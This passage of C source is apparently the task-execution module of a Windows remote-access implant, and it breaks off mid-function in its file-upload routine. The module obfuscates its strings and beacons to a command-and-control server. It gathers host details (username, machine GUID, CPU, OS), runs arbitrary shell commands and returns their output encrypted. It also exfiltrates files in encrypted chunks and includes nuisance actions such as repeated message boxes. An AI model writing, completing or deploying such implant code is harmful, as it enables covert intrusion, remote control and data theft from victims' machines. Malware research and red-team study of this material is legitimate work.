#include "exec.h"

DWORD parseDownloadArg(char* input, size_t* fileSize, char* text, char* filePath, size_t maxTextSize, size_t filePathSize) {
    char *token;
    // char buffer[1024] = {0};  // Assuming input will not be larger than 1024 characters

    // // Copy input to buffer to avoid modifying the original input string
    // strncpy(buffer, input, strlen(input));

    // Get the first token (fileSize)
    LAIKA_BOX_STARTVAR(char*, delim, KEY_exec_parseDownloadArg_divider, DATA_exec_parseDownloadArg_divider)
    token = strtok(input, delim);
    if (token == NULL) {
        debug_printf("Cannot parse fileSize\n");
        return ERROR_GEN_FAILURE;
    }
    *fileSize = strtoul(token, NULL, 10);
    debug_printf("%lld\n", *fileSize);
    // Get the second token (text)
    token = strtok(NULL, delim);
    if (token == NULL) {
        debug_printf("Cannot parse text\n");
        return ERROR_GEN_FAILURE;
    }
    strcpy(text, token);
    debug_printf("%s\n", text);

    // Get the third token (filePath)
    token = strtok(NULL, delim);
    if (token == NULL) {
        debug_printf("Cannot parse filePath\n");
        return ERROR_GEN_FAILURE;
    }
    LAIKA_BOX_ENDVAR(delim)
    strcpy(filePath, token);
    debug_printf("%.3s\n", filePath);
    return ERROR_SUCCESS;
}

DWORD call_calc() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    // Zero the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    // Start the child process. 
    LAIKA_BOX_STARTVAR(char*, calcPath, KEY_exec_callCalc, DATA_exec_callCalc)
    if (!CreateProcess(calcPath, // Use Calculator path
        NULL,        // Command line
        NULL,        // Process handle not inheritable
        NULL,        // Thread handle not inheritable
        FALSE,       // Set handle inheritance to FALSE
        0,           // No creation flags
        NULL,        // Use parent's environment block
        NULL,        // Use parent's starting directory 
        &si,         // Pointer to STARTUPINFO structure
        &pi)         // Pointer to PROCESS_INFORMATION structure
    ) {
        return GetLastError();
    }
    LAIKA_BOX_ENDVAR(calcPath)
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return ERROR_SUCCESS;
}

DWORD parseHowler(const char *input, int *number, char *text) {
    // The format specifies an integer followed by a '|' character, then a string up to the size of text - 1 (to leave space for the null terminator)
    int result = sscanf(input, "%d|%s", number, text);
    
    if (result != 2) { // Check if both the integer and the string were successfully parsed
        return ERROR_GEN_FAILURE;
    }

    return ERROR_SUCCESS;
}

// Thread function for displaying the message box
DWORD WINAPI DisplayMessageBoxThread(LPVOID lpParam) {
    MessageBox(NULL, (LPCTSTR)lpParam, "lol", MB_OK | MB_SYSTEMMODAL);
    return 0;
}

// Showing message box
void ShowMessageBoxAsync(const char* message) {
    DWORD threadId;
    // Create a new thread to show the message box
    HANDLE hThread = CreateThread(NULL, 0, DisplayMessageBoxThread, (void*)message, 0, &threadId);
    if (hThread != NULL) {
        // Optionally, close the thread handle if you no longer need it
        CloseHandle(hThread);
    }
}

// cmdLine has to be a NULL terminated string
DWORD runShellCommand(LPSTR cmdLine, LPSTR lpOutputBuffer, DWORD cbOutputMax) {

    SECURITY_ATTRIBUTES sa;
    // Set the bInheritHandle flag so pipe handles can be inherited
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT
    HANDLE hPipeReadEnd, hPipeWriteEnd;
    if (!CreatePipe(&hPipeReadEnd, &hPipeWriteEnd, &sa, 0)) {
        debug_printf("Stdout pipe creation failed\n");
        return GetLastError();
    }
    // Ensure the read handle to the pipe for child process is not inherited
    if (!SetHandleInformation(hPipeReadEnd, HANDLE_FLAG_INHERIT, 0)) {
        debug_printf("set handle info failed\n");
        return GetLastError();
    }

    // Set up the STARTUPINFO structure for the child process
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = hPipeWriteEnd;
    si.hStdOutput = hPipeWriteEnd;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Start the child process
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        debug_printf("CreateProcess failed.\n");
        return GetLastError();
    }

    // Close the write end of the pipe before reading from the read end
    CloseHandle(hPipeWriteEnd);
    // read form pipe
    DWORD dwBytesRead = 0;
    DWORD dwTotalBytesRead = 0;
    CHAR chunk[1024];
    for (;;) {
        BOOL success = ReadFile(hPipeReadEnd, (LPVOID) chunk, sizeof(chunk), &dwBytesRead, NULL);
        if (!success || dwBytesRead == 0) break;
        if (dwTotalBytesRead + dwBytesRead > cbOutputMax - 1) {
            memcpy(&lpOutputBuffer[dwTotalBytesRead], chunk, cbOutputMax - 1 - dwTotalBytesRead);
            dwTotalBytesRead = cbOutputMax - 1;
            TerminateProcess(pi.hProcess, 5);
            break;
        }
        // copy to target buffer chunk by chunk
        memcpy(&lpOutputBuffer[dwTotalBytesRead], chunk, dwBytesRead);
        dwTotalBytesRead += dwBytesRead;
    }
    lpOutputBuffer[dwTotalBytesRead] = '\0';

    // Wait for the child process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hPipeReadEnd);

    return ERROR_SUCCESS;
}

DWORD infoGather(uint8_t* buffer, size_t bufferSize, size_t* actualStreamSize, char* client_guid_real_b64) {
    CHAR productName[256] = {0}, deviceName[256] = {0}, cpuBrandString[256] = {0}, userName[256] = {0}, guid[256] = {0};
    DWORD productNameSize = 256, deviceNameSize = 256, cpuBrandStringSize = 256;
    DWORD userNameSize = 256, guid_size = 256;
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    double totalPhysMemGB;
    HKEY hKey;
    LONG lRet;

    // Get CPU Brand String
    LAIKA_BOX_STARTVAR(char*, cpu_key, KEY_exec_infogather_central_processor_key, DATA_exec_infogather_central_processor_key)
    lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, cpu_key, 0, KEY_READ, &hKey);
    LAIKA_BOX_ENDVAR(cpu_key)
    if (lRet != ERROR_SUCCESS) {
        debug_printf("Failed to open registry key for CPU information.\n");
        return (DWORD)lRet;
    }
    
    LAIKA_BOX_STARTVAR(char*, cpu_str, KEY_exec_infogather_central_processor_str, DATA_exec_infogather_central_processor_str)
    lRet = RegQueryValueExA(hKey, cpu_str, NULL, NULL, (LPBYTE) cpuBrandString, &cpuBrandStringSize);
    LAIKA_BOX_ENDVAR(cpu_str)

    if (lRet != ERROR_SUCCESS) {
        debug_printf("Failed to query CPU information from registry.\n");
        RegCloseKey(hKey);
        return (DWORD)lRet;
    }
    RegCloseKey(hKey);
    debug_printf("dead in infogather()\n");


    // Get Windows Installation GUID
    LAIKA_BOX_STARTVAR(char*, guidkey, KEY_exec_infogather_guid_key, DATA_exec_infogather_guid_key)
    lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, guidkey, 0, KEY_READ, &hKey);
    LAIKA_BOX_ENDVAR(guidkey)

    if (lRet != ERROR_SUCCESS) {
        debug_printf("Failed to open registry key for CPU information.\n");
        return (DWORD)lRet;
    }
    
    LAIKA_BOX_STARTVAR(char*, guidstr, KEY_exec_infogather_guid_str, DATA_exec_infogather_guid_str)
    lRet = RegQueryValueExA(hKey, guidstr, NULL, NULL, (LPBYTE) guid, &guid_size);
    LAIKA_BOX_ENDVAR(guidstr)

    if (lRet != ERROR_SUCCESS) {
        debug_printf("Failed to query MachineGuid information from registry.\n");
        RegCloseKey(hKey);
        return (DWORD)lRet;
    }
    RegCloseKey(hKey);
    debug_printf("dead in infogather()\n");

    // Get Windows Product Name
    LAIKA_BOX_STARTVAR(char*, versionkey, KEY_exec_infogather_version_key, DATA_exec_infogather_version_key)
    lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, versionkey, 0, KEY_READ, &hKey);
    LAIKA_BOX_ENDVAR(versionkey)

    if (lRet != ERROR_SUCCESS) {
        debug_printf("Failed to open registry key for Windows product name.\n");
        return (DWORD)lRet;
    }
    LAIKA_BOX_STARTVAR(char*, productnameStr, KEY_exec_infogather_version_str, DATA_exec_infogather_version_str)
    lRet = RegQueryValueExA(hKey, productnameStr, NULL, NULL, (LPBYTE)productName, &productNameSize);
    LAIKA_BOX_ENDVAR(productnameStr)
    
    if (lRet != ERROR_SUCCESS) {
        debug_printf("Failed to query Windows product name from registry.\n");
        RegCloseKey(hKey);
        return (DWORD)lRet;
    }
    RegCloseKey(hKey);

    // Get Device (Computer) Name
    if (!GetComputerNameA(deviceName, &deviceNameSize)) {
        debug_printf("Failed to get computer name.\n");
        return GetLastError();
    }
    if (!GetUserNameA(userName, &userNameSize)) {
        debug_printf("Failed to get user name.\n");
        return ERROR_GEN_FAILURE;
    }
    if (GlobalMemoryStatusEx(&memInfo)) {
        DWORDLONG totalPhysMem = memInfo.ullTotalPhys;
        // Optionally, convert to more readable units, like GB
        totalPhysMemGB = totalPhysMem / (double)(1024 * 1024 * 1024);
    } else {
        debug_printf("Failed to get system memory size.\n");
        return ERROR_GEN_FAILURE;
    }
    char totalMem[16] = {0};
    sprintf(totalMem, "%.2f", totalPhysMemGB);
    // Message Encoding
    debug_printf("In infogater() Username is: %s\n", userName);
    InfoGather message = InfoGather_init_zero;
    strcpy(message.guid, client_guid_real_b64);
    strcpy(message.username, userName);
    strcpy(message.windows, guid);  // TODO: Think about another meaningful field
    strcpy(message.productname, productName);
    strcpy(message.CPU, cpuBrandString);
    strcpy(message.devicename, deviceName);
    strcpy(message.mem, totalMem);
    pb_ostream_t stream = pb_ostream_from_buffer(buffer, bufferSize);
    size_t err_check = serialize(&stream, &message, InfoGather_fields); if (err_check == 0) return ERROR_GEN_FAILURE;

    *actualStreamSize = err_check;
    return ERROR_SUCCESS; // Success
    return ERROR_SUCCESS;
}


DWORD execTask_clientMode(DWORD opcode, char* msg_args, LPBYTE pchRequest, char* pipeFullPath,
               uint8_t* suburl_bin, uint8_t* client_guid_ephemeral, uint8_t* key_kdf_guid, 
               uint8_t* nonce_send, uint8_t* session_key_send, uint8_t* key_kdf_send,
               uint8_t* nonce_rcv, uint8_t* session_key_rcv, uint8_t* key_kdf_rcv, 
               char* client_guid_real_b64, DWORD* beacon_Interval) {

    char client_guid_ephemeral_b64[crypto_kx_PUBLICKEYBYTES * 2];
    sodium_bin2base64(client_guid_ephemeral_b64, sizeof(client_guid_ephemeral_b64), 
                      client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES, 
                      sodium_base64_VARIANT_ORIGINAL);
    char args[4096];
    strcpy(args, msg_args);
    debug_printf(" === Task Execution === \n");
    switch (opcode) {
        case IDLE: {
            debug_printf("== EXECUTING IDLE ==\n");
            return ERROR_SUCCESS;
        }
        
        case DISSOLVE: {
            debug_printf(" == EXECUTING DISSOLVE ==\n");
            exit(0);
        }

        case ADJUST_BEACON: {
            debug_printf(" == EXECUTING ADJUST_BEACON ==\n");
            debug_printf("new beacon interval: %d", atoi(args));
            *beacon_Interval = atoi(args);
            return ERROR_SUCCESS;
        }

        case SMOKESCREEN: {
            debug_printf(" == EXECUTING SMOKESCREEN ==\n");
            int smoke_max = atoi(args);
            int smoke = 0;
            while (smoke <= smoke_max) {
                /* Generate random data */
                /* Generate random URL */
                /* Send to the URL without caring about results */
            }
            return ERROR_SUCCESS;
        }

        case TAUNT: {
            return call_calc();

        }
        
        case HOWLER: {
            int repeat_howler;
            char text_howler[128];
            int repeat = 0;
            if (parseHowler(args, &repeat_howler, text_howler) != ERROR_SUCCESS) {
                return ERROR_GEN_FAILURE;
            }
            while (repeat <= repeat_howler) {
                ShowMessageBoxAsync(text_howler);
                repeat++;
            }
            return ERROR_SUCCESS;
        }

        case INFOGATHER: {
            debug_printf(" == EXECUTING INFOGATHER ==\n");
            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            BYTE buffer_serialize[4096];
            size_t actualSerializedSize;
            if (infoGather(buffer_serialize, 4096, &actualSerializedSize, client_guid_real_b64) != ERROR_SUCCESS) {
                debug_printf("[-] In Exec -> INFOGATHER: Failed to infoGather\n");
                return ERROR_GEN_FAILURE;
            }
            if (actualSerializedSize == 0) {
                debug_printf("[-] In Exec -> INFOGATHER: Failed to serialize\n");
                return ERROR_GEN_FAILURE;
            }
            BYTE ciphertext[actualSerializedSize + crypto_aead_chacha20poly1305_ABYTES];
            size_t ciphertext_len;
            crypto_aead_chacha20poly1305_encrypt(
                                            ciphertext, &ciphertext_len,
                                            buffer_serialize, actualSerializedSize,
                                            NULL, 0, NULL, 
                                            nonce_send, session_key_send);
            // Encapsulate Message into msg_enc
            Message_encrypt msg_enc = Message_encrypt_init_zero;
            msg_enc.ciphertext.size = ciphertext_len;
            memcpy(msg_enc.ciphertext.bytes, ciphertext, ciphertext_len);
            strcpy(msg_enc.guid, client_guid_ephemeral_b64);

            // Serialzie Data Again
            SecureZeroMemory(buffer_serialize, sizeof(buffer_serialize));
            pb_ostream_t stream_o = pb_ostream_from_buffer(buffer_serialize, sizeof(buffer_serialize));
            size_t err_check = serialize(&stream_o, &msg_enc, Message_encrypt_fields);
            if (err_check == 0) debug_printf( "[-] Can't serialize buffer for msg_enc.\n");
            actualSerializedSize = err_check;
            char URL[URL_SIZE] = {0}; 
            
            LAIKA_BOX_STARTVAR(char*, path_infogather, KEY_interneth_PATH_INFOGATHER, DATA_interneth_PATH_INFOGATHER)
            getting_URL(suburl_bin, path_infogather, URL);
            LAIKA_BOX_ENDVAR(path_infogather);
            
            char buffer_send[4096 + URL_SIZE];
            memcpy(buffer_send, URL, URL_SIZE);
            memcpy(&buffer_send[URL_SIZE], buffer_serialize, sizeof(buffer_serialize));
            char buffer_received[4096]; DWORD actualReceivedSize;  // Needs change to pipe client
            if (pipeClient(pipeFullPath, (LPBYTE) buffer_send, actualSerializedSize + URL_SIZE, 
                   (LPBYTE)buffer_received, sizeof(buffer_received), &actualReceivedSize) != 0) {
                debug_printf("[-] Can't send protobuf in Beacon\n");
                return ERROR_NOT_CONNECTED;
            }
            if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                        suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                        key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                        client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                        nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                        key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                        session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate send Session key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                        nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                        key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                        session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate rcv Session key\n");
                return ERROR_GEN_FAILURE;
            }
            return ERROR_SUCCESS;
        }

        case SHELLCMD: {
            debug_printf(" == EXECUTING SHELLCMD ==\n");
            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            LPBYTE buffer_result = (LPBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 768 * 3 * sizeof(BYTE));
            if (buffer_result == NULL) {
                debug_printf("[-] In Exec(): Failed to Allocate memory for shell command result\n");
                return ERROR_GEN_FAILURE;
            }

            // memcpy(buffer_result, "abc", 3);
            if (runShellCommand(args, (LPSTR)buffer_result, 1024*1024*3) != ERROR_SUCCESS) {  // Run args and put result to buffer_result
                debug_printf("[-] In Exec():Failed to execute runShellCommand.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                return ERROR_GEN_FAILURE;
            }
            debug_printf("buffer_result length: %lld", strlen((char*)buffer_result));

            /* Parse into data */
            Shell_execution* shell_result = (Shell_execution*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Shell_execution));
            if (shell_result == NULL) {
                debug_printf("[-] In Exec():Failed to allocate memory for shell_result.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);;
                return ERROR_GEN_FAILURE;
            }
            LPBYTE buffer_serialize = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, 1024 * 1024 * 3 * sizeof(BYTE));
            if (buffer_serialize == NULL) {
                debug_printf("[-] In Exec(): Failed to Allocate memory for buffer_serialize.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                return ERROR_GEN_FAILURE;
            }
            
            // Filling neccesary fields
            strcpy(shell_result->guid, client_guid_real_b64);
            strcpy(shell_result->result, (char*)buffer_result);
            strcpy(shell_result->command, args);
            
            /* Serialize shell_execution*/
            pb_ostream_t stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1024 * 3);
            size_t err_check = serialize(&stream, shell_result, Shell_execution_fields);
            if (err_check == 0) {
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                debug_printf("[-] In Exec(): Failed to serialzied shell_result\n");
                return ERROR_GEN_FAILURE;
            }
            
            /* Encrypt message */
            // Allocate buffer to hold the ciphertext
            LPBYTE ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
            size_t ciphertext_len;
            if (ciphertext == NULL) {
                debug_printf("[-] In Exec(): Failed to Allocate memory for ciphertext.\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                return ERROR_GEN_FAILURE;
            }
            crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                 buffer_serialize, err_check, 
                                                 NULL, 0, NULL, 
                                                 nonce_send, session_key_send);

            /* Encapsulate */
            Message_encrypt_large* message_encrypt_large = (Message_encrypt_large*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Message_encrypt_large));
            if (message_encrypt_large == NULL) {
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                debug_printf("[-] In Exec(): Failed to allocate data to message_encrypt_large\n");
                return ERROR_GEN_FAILURE;
            }
            
            // Filling neccesary fields
            debug_printf("[!] In Exec(): client_guid_ephemeral is %s\n", client_guid_ephemeral_b64);
            strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
            message_encrypt_large->ciphertext.size = ciphertext_len;
            memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);

            /* Serialize Message_encrypt_large */
            // Allocate the buffer to hold the stream
            LPBYTE buffer_data = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, (REQUSET_BUFSIZE - URL_SIZE) * sizeof(BYTE));
            if (buffer_data == NULL) {
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                debug_printf("[-] In Exec(): Failed to allocate data to buffer_send\n");
                return ERROR_GEN_FAILURE;
            }
            stream = pb_ostream_from_buffer(buffer_data, REQUSET_BUFSIZE - URL_SIZE);
            err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
            if (err_check == 0) {
                debug_printf(" [!] In Exec(): Can't serialize data for message_encrypt_large\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_data);
                return ERROR_GEN_FAILURE;
            }
            debug_printf("In exec_client[], buffer_data length is %lld", err_check);
            
            /* Send data to C2 server */
            char URL[URL_SIZE] = {0};

            LAIKA_BOX_STARTVAR(char*, path_shellcmd, KEY_interneth_PATH_SHELLCMD, DATA_interneth_PATH_SHELLCMD)
            getting_URL(suburl_bin, path_shellcmd, URL);
            LAIKA_BOX_ENDVAR(path_shellcmd)

            memcpy(pchRequest, URL, URL_SIZE);
            memcpy(&pchRequest[URL_SIZE], buffer_data, err_check);
            char buffer_received[4096]; DWORD actualReceivedSize;
            if (pipeClient(pipeFullPath, pchRequest, err_check + URL_SIZE, 
                           (LPBYTE)buffer_received, sizeof(buffer_received), 
                           &actualReceivedSize) != ERROR_SUCCESS) {
                debug_printf("[-] Can't send protobuf in Beacon\n");
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_data);
                return ERROR_GEN_FAILURE;
            }
            debug_printf("[+] In Exec(): I sent to server %lld\n", err_check);

            // Free the buffer to finish
            {
                HeapFree(GetProcessHeap(), 0, buffer_result);
                HeapFree(GetProcessHeap(), 0, shell_result);
                HeapFree(GetProcessHeap(), 0, buffer_serialize);
                HeapFree(GetProcessHeap(), 0, ciphertext);
                HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                HeapFree(GetProcessHeap(), 0, buffer_data);
            }
            
            if (derive_nonce_kdf_session(key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                         suburl_bin, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                         key_kdf_guid, crypto_kx_SESSIONKEYBYTES, 
                                         client_guid_ephemeral, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate guid_ephmeral subURL and guid_kdf key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                         nonce_send, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                         key_kdf_send, crypto_kx_SESSIONKEYBYTES, 
                                         session_key_send, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate send Session key\n");
                return ERROR_GEN_FAILURE;
            }
            if (derive_nonce_kdf_session(key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                         nonce_rcv, crypto_aead_chacha20poly1305_NPUBBYTES, 
                                         key_kdf_rcv, crypto_kx_SESSIONKEYBYTES, 
                                         session_key_rcv, crypto_kx_SESSIONKEYBYTES) != ERROR_SUCCESS) {
                debug_printf("[-] Can't generate rcv Session key\n");
                return ERROR_GEN_FAILURE;
            }

            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            return ERROR_SUCCESS;
        }

        case UPLOAD: {
            debug_printf(" == EXECUTING UPLOAD ==\n");
            SecureZeroMemory(pchRequest, REQUSET_BUFSIZE);
            file_t fileTarget;
            LONGLONG fileSize;

            if (mapFile(args, &fileTarget)) {
                debug_printf("file size: %lld\n", fileTarget.fileSize.QuadPart);
                fileSize = fileTarget.fileSize.QuadPart;
                LONGLONG bytesRead = 0;

                /* Allocate memory for reading files, serialize and encryption*/
                DWORD chunkSize = 1024 * 1024 * 3;
                FileStream* fileStream = (FileStream*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FileStream));
                if (fileStream == NULL) {
                    debug_printf("[-] In Exec-UPLOAD:Failed to allocate memory for fileStream.\n");
                    // HeapFree(GetProcessHeap(), 0, chunk);;
                    return ERROR_GEN_FAILURE;
                }
                
                LPBYTE buffer_serialize = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, 1024 * 1048 * 3 * sizeof(BYTE));
                if (buffer_serialize == NULL) {
                    debug_printf("[-] In Exec UPLOAD: Failed to Allocate memory for buffer_serialize.\n");
                    // HeapFree(GetProcessHeap(), 0, chunk);
                    HeapFree(GetProcessHeap(), 0, fileStream);
                    return ERROR_GEN_FAILURE;
                }

                Message_encrypt_large* message_encrypt_large = (Message_encrypt_large*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Message_encrypt_large));
                if (message_encrypt_large == NULL) {
                    debug_printf("[-] In Exec UPLOAD: Failed to Allocate memory for buffer_serialize.\n");
                    HeapFree(GetProcessHeap(), 0, fileStream);
                    HeapFree(GetProcessHeap(), 0, buffer_serialize);
                    return ERROR_GEN_FAILURE;
                }

                LPBYTE buffer_data = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, (REQUSET_BUFSIZE - URL_SIZE) * sizeof(BYTE));
                if (buffer_data == NULL) {
                    debug_printf("[-] In Exec UPLOAD: Failed to Allocate memory for buffer_serialize.\n");
                    HeapFree(GetProcessHeap(), 0, fileStream);
                    HeapFree(GetProcessHeap(), 0, buffer_serialize);
                    HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                    return ERROR_GEN_FAILURE;
                }

                pb_ostream_t stream;
                size_t err_check;
                for (DWORD i = 0; i < (fileSize + chunkSize - 1) / chunkSize; i++) {
                    char URL[URL_SIZE] = {0}; 
                    
                    LAIKA_BOX_STARTVAR(char*, path_upload, KEY_interneth_PATH_UPLOAD, DATA_interneth_PATH_UPLOAD)
                    getting_URL(suburl_bin, path_upload, URL);
                    LAIKA_BOX_ENDVAR(path_upload)

                    if (bytesRead + chunkSize <= fileSize) {
                        // Populate protobuf fields
                        strcpy(fileStream->guid, client_guid_real_b64);
                        fileStream->order = i;
                        strcpy(fileStream->filename, args);
                        fileStream->fileSize = fileSize;
                        fileStream->actualRead = chunkSize;
                        fileStream->chunk.size = chunkSize;
                        memcpy(fileStream->chunk.bytes, &fileTarget.lpBuffer[bytesRead], chunkSize);

                        // Serialize
                        SecureZeroMemory(buffer_serialize, 1024 * 1048 * 3);
                        stream = pb_ostream_from_buffer(buffer_serialize, 1024 * 1048 * 3);
                        err_check = serialize(&stream, fileStream, FileStream_fields);
                        if (err_check == 0) {
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, buffer_data);
                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied fileStream\n");
                            return ERROR_GEN_FAILURE;
                        }
                        
                        /* Encrypt Message */
                        // Allocate buffer to hold the ciphertext
                        LPBYTE ciphertext = (LPBYTE) HeapAlloc(GetProcessHeap(), 0, crypto_aead_chacha20poly1305_ABYTES + err_check);
                        size_t ciphertext_len;
                        if (ciphertext == NULL) {
                            debug_printf("[-] In Exec() UPLOAD: Failed to Allocate memory for ciphertext.\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, buffer_data);
                            return ERROR_GEN_FAILURE;
                        }
                        crypto_aead_chacha20poly1305_encrypt(ciphertext, &ciphertext_len, 
                                                            buffer_serialize, err_check, 
                                                            NULL, 0, NULL, 
                                                            nonce_send, session_key_send);

                        /* Encapsulate */
                        // Filling neccesary fields
                        strcpy(message_encrypt_large->guid_ephmeral, client_guid_ephemeral_b64);
                        message_encrypt_large->ciphertext.size = ciphertext_len;
                        memcpy(message_encrypt_large->ciphertext.bytes, ciphertext, ciphertext_len);
                        stream = pb_ostream_from_buffer(buffer_data, REQUSET_BUFSIZE);
                        err_check = serialize(&stream, message_encrypt_large, Message_encrypt_large_fields);
                        if (err_check == 0) {
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            HeapFree(GetProcessHeap(), 0, buffer_data);

                            debug_printf("[-] In Exec() UPLOAD: Failed to serialzied message_encrypt_large\n");
                            return ERROR_GEN_FAILURE;
                        }

                        memcpy(pchRequest, URL, URL_SIZE);
                        memcpy(&pchRequest[URL_SIZE], buffer_data, err_check);
                        char buffer_received[4096]; DWORD actualReceivedSize;
                        if (pipeClient(pipeFullPath, pchRequest, err_check + URL_SIZE, 
                                       (LPBYTE)buffer_received, sizeof(buffer_received), 
                                       &actualReceivedSize) != ERROR_SUCCESS) {
                            debug_printf("[-] Can't send protobuf in UPLOAD\n");
                            HeapFree(GetProcessHeap(), 0, fileStream);
                            HeapFree(GetProcessHeap(), 0, buffer_serialize);
                            HeapFree(GetProcessHeap(), 0, message_encrypt_large);
                            HeapFree(GetProcessHeap(), 0, ciphertext);
                            HeapFree(GetProcessHeap(), 0, buffer_data);
                            return ERROR_GEN_FAILURE;
                        }
                        
                        
                        bytesRead += chunkSize;
                        HeapFree(GetProcessHeap(), 0, ciphertext);
                    } else {
                        size_t chunkSize_final = fileSize - bytesRead;
                        // Populate protobuf fields
                        strcpy(fileStream->guid, client_guid_real_b64);
                        fileStream->order = i;
                        strcpy(fileStream->filename, args);
                        fileStream->fileSize = fileSize;
